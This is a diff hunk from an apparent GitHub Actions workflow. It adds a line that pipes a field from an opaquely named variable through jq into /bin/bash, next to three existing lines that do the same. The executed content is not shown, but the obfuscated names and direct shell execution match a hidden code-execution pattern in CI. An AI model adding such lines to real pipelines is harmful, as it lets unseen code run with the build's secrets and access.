@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$dp72168" | jq -r .zsl20054 | /bin/bash
           echo $dpjbw2 | jq -r .apua3473 | /bin/bash
           echo $f318 | jq -r .os87262 | /bin/bash
+          printf '%s' "$gtl6402" | jq -r .tje00 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
